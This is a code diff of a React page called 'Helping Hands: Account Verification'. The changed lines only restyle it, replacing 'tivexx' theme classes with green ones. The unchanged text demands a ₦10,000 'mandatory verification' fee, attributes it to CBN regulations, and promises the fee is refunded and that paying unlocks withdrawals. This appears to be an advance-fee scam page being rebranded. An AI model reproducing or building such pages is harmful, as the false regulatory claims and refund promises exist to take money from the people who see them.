@@ -29,15 +29,15 @@ export default function VerifyMePage() {
   }
 
   return (
-    <div className="min-h-screen relative flex flex-col items-center justify-start bg-tivexx-gradient text-white overflow-y-auto py-10 px-4 animate-fade-in">
+    <div className="min-h-screen relative flex flex-col items-center justify-start bg-gradient-to-br from-green-500 to-green-700 text-white overflow-y-auto py-10 px-4 animate-fade-in">
       <h1 className="text-5xl font-extrabold mb-6 text-center animate-glow flex items-center justify-center">
         Helping Hands
       </h1>
 
-      <Card className="relative z-10 max-w-md w-full p-8 backdrop-blur-lg bg-white/10 border border-tivexx shadow-2xl rounded-2xl animate-slide-up hover:scale-[1.03] hover:shadow-xl transition-transform duration-500 overflow-hidden">
+      <Card className="relative z-10 max-w-md w-full p-8 backdrop-blur-lg bg-white/10 border border-green-300 shadow-2xl rounded-2xl animate-slide-up hover:scale-[1.03] hover:shadow-xl transition-transform duration-500 overflow-hidden">
         <div className="flex flex-col items-center space-y-6 relative z-10">
-          <div className="w-20 h-20 bg-white/5 rounded-full flex items-center justify-center animate-bounce-slow">
-            <ShieldCheck className="h-12 w-12 text-tivex-muted" />
+          <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center animate-bounce-slow">
+            <ShieldCheck className="h-12 w-12 text-green-200" />
           </div>
 
           <div className="flex items-center space-x-3 animate-slide-up relative">
@@ -45,11 +45,11 @@ export default function VerifyMePage() {
               Account Verification
             </h1>
             {tickVisible && (
-              <CheckCircle className="h-8 w-8 text-tiv-3 animate-slide-in-left" />
+              <CheckCircle className="h-8 w-8 text-green-400 animate-slide-in-left" />
             )}
           </div>
 
-          <p className="text-center text-sm text-tivex-muted leading-relaxed max-w-xl animate-slide-up">
+          <p className="text-center text-sm text-green-100 leading-relaxed max-w-xl animate-slide-up">
             To comply with <strong>CBN regulations</strong> and prevent fraudulent activity and bots,
             a <strong>mandatory verification</strong> is required. Completing verification ensures your
             withdrawals are fully protected.
@@ -61,7 +61,7 @@ export default function VerifyMePage() {
               <p className="text-4xl md:text-5xl font-extrabold text-yellow-300">
                 ₦10,000
               </p>
-              <p className="text-sm text-tivex-muted mt-1">
+              <p className="text-sm text-green-100 mt-1">
                 One-time verification fee, <strong>automatically refunded</strong> to your dashboard balance after successful verification.
               </p>
             </div>
@@ -69,29 +69,29 @@ export default function VerifyMePage() {
 
           <div className="space-y-3 w-full text-left animate-slide-up">
             <div className="flex items-center space-x-3">
-              <UserCheck className="h-5 w-5 text-tiv-2" />
+              <UserCheck className="h-5 w-5 text-green-300" />
               <span className="text-sm">Identity protection</span>
             </div>
             <div className="flex items-center space-x-3">
-              <UserCheck className="h-5 w-5 text-tiv-2" />
+              <UserCheck className="h-5 w-5 text-green-300" />
               <span className="text-sm">Prevents fraud & bots</span>
             </div>
             <div className="flex items-center space-x-3">
-              <UserCheck className="h-5 w-5 text-tiv-2" />
+              <UserCheck className="h-5 w-5 text-green-300" />
               <span className="text-sm">Unlocks withdrawals & premium features</span>
             </div>
           </div>
 
           <div className="w-full animate-slide-up">
             <Button
-              className="w-full py-4 text-lg font-semibold btn-tivexx-cta hover:shadow-xl transition-all flex items-center justify-center space-x-2"
+              className="w-full py-4 text-lg font-semibold bg-gradient-to-r from-purple-800 via-purple-700 to-green-600 hover:from-purple-900 hover:to-green-700 hover:shadow-xl transition-all flex items-center justify-center space-x-2"
               onClick={handleProceed}
             >
               <span>Proceed to Verification</span>
               <ArrowRight className="h-5 w-5" />
             </Button>
 
-            <p className="mt-3 text-xs text-tivex-muted text-center animate-slide-up">
+            <p className="mt-3 text-xs text-green-200 text-center animate-slide-up">
               The ₦10,000 verification payment will be added back to your dashboard balance after verification.
             </p>
           </div>
@@ -101,7 +101,7 @@ export default function VerifyMePage() {
       <style jsx global>{`
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes glow { 0%, 100% { text-shadow:0 0 5px #4F5D75,0 0 10px #7261A3,0 0 20px #7261A3; } 50% { text-shadow:0 0 10px #4F5D75,0 0 20px #7261A3,0 0 40px #A67DB8; } }
+        @keyframes glow { 0%, 100% { text-shadow:0 0 5px #34d399,0 0 10px #10b981,0 0 20px #10b981; } 50% { text-shadow:0 0 10px #34d399,0 0 20px #10b981,0 0 40px #059669; } }
         @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
         @keyframes spin-slow { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         @keyframes slideInLeft { 0% { transform: translateX(-50px); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }
